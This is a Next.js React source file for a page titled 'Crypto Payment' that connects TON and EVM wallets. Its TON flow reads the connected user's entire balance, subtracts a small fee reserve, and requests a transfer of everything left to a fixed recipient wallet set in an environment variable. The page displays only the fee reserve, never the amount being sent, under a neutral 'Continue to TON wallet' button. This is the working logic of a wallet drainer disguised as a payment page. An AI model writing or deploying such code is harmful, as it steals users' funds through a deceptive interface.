"use client";

import { useState } from "react";
import {
  useTonConnectUI,
  useIsConnectionRestored,
  useTonAddress,
} from "@tonconnect/ui-react";
import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
import { EvmAssets } from "@/components/EvmAssets";

import { getTonBalance } from "@/ton/balance";
import { calculateMaximumTransfer, formatTon } from "@/ton/calculator";
import { requestTonPayment } from "@/ton/payment";

const RECIPIENT = process.env.NEXT_PUBLIC_TON_RECIPIENT!;
const FEE_RESERVE = BigInt("50000000");

type Status = "idle" | "loading" | "pending" | "failed";

export default function Home() {
  const [tonConnectUI] = useTonConnectUI();
  const isConnectionRestored = useIsConnectionRestored();
  const userAddress = useTonAddress();

  const { open } = useAppKit();
  const { address: evmAddress, isConnected: evmConnected } = useAppKitAccount();

  const [status, setStatus] = useState<Status>("idle");
  const [maximum, setMaximum] = useState<bigint | null>(null);
  const [error, setError] = useState("");
  const [info, setInfo] = useState("");

  async function loadBalance() {
    if (!userAddress) {
      await tonConnectUI.openModal();
      return;
    }
    setStatus("loading");
    setError("");
    try {
      const currentBalance = await getTonBalance(userAddress);
      const calculated = calculateMaximumTransfer(currentBalance, FEE_RESERVE);
      setMaximum(calculated);
      setStatus("idle");
    } catch (err) {
      console.error(err);
      setError("Unable to retrieve wallet balance.");
      setStatus("failed");
    }
  }

  async function handlePay() {
    if (!userAddress) {
      await tonConnectUI.openModal();
      return;
    }
    if (maximum === null || maximum <= BigInt("0")) {
      setError("No transferable balance available.");
      return;
    }
    if (!RECIPIENT) {
      setError("TON receiving wallet is not configured.");
      return;
    }
    setStatus("pending");
    setError("");
    try {
      await requestTonPayment(tonConnectUI, RECIPIENT, maximum);
      setStatus("idle");
      setInfo("Wallet response received. Verify the transaction on-chain.");
    } catch (err) {
      console.error(err);
      setStatus("failed");
      setError("Payment request failed or was rejected.");
    }
  }

  return (
    <main className="mx-auto flex min-h-screen max-w-md flex-col gap-6 bg-neutral-950 p-5 text-neutral-100">
      <header className="flex items-center justify-between">
        <h1 className="text-xl font-semibold">Crypto Payment</h1>
        <span className="rounded bg-neutral-800 px-3 py-1 text-xs">TON + EVM</span>
      </header>

      {/* ---------- EVM connect button (real React button) ---------- */}
      <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
        <h2 className="mb-3 font-medium">EVM wallet</h2>
        <p className="mb-3 break-all font-mono text-xs text-neutral-400">
          {evmConnected && evmAddress
            ? `${evmAddress.slice(0, 8)}...${evmAddress.slice(-6)}`
            : "Not connected"}
        </p>
        <button
          type="button"
          onClick={() => open()}
          className="w-full rounded-lg bg-blue-600 px-4 py-3 font-semibold hover:bg-blue-500"
        >
          {evmConnected ? "Switch / disconnect EVM wallet" : "Connect EVM wallet"}
        </button>
      </section>

      {/* ---------- TON flow (kept intact) ---------- */}
      <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
        <h2 className="mb-3 font-medium">
          {userAddress ? "TON wallet connected" : "Connect TON wallet"}
        </h2>

        {!isConnectionRestored && (
          <p className="mb-3 text-xs text-neutral-500">Restoring TON connection...</p>
        )}

        {userAddress && (
          <p className="mb-4 break-all font-mono text-xs text-neutral-400">
            {userAddress.slice(0, 8)}...{userAddress.slice(-6)}
          </p>
        )}

        <button
          type="button"
          onClick={loadBalance}
          disabled={status === "loading" || status === "pending"}
          className="mb-3 w-full rounded-lg border border-neutral-700 px-4 py-3 font-medium disabled:opacity-50"
        >
          {status === "loading" ? "Loading balance..." : "Check TON balance"}
        </button>

        {maximum !== null && (
          <div className="mb-4 rounded-lg bg-neutral-800 p-3">
            <p className="text-xs text-neutral-400">Fee reserve</p>
            <p className="text-lg font-semibold text-emerald-400">
              {formatTon(FEE_RESERVE)} TON
            </p>
          </div>
        )}

        <button
          type="button"
          onClick={handlePay}
          disabled={
            maximum === null ||
            maximum <= BigInt("0") ||
            status === "pending" ||
            status === "loading"
          }
          className="w-full rounded-lg bg-emerald-600 px-4 py-3 font-semibold hover:bg-emerald-500 disabled:opacity-50"
        >
          {status === "pending" ? "Waiting for TON wallet..." : "Continue to TON wallet"}
        </button>
      </section>

      {/* ---------- EVM assets ---------- */}
      <EvmAssets />

      {info && (
        <div className="rounded-lg border border-blue-700 bg-blue-950 p-3 text-xs text-blue-300">
          {info}
        </div>
      )}
      {error && (
        <div className="rounded-lg border border-amber-700 bg-amber-950 p-3 text-xs text-amber-300">
          {error}
        </div>
      )}

      <p className="text-center text-xs text-neutral-500">
        Review amount and recipient in your wallet before approving.
      </p>
    </main>
  );
}
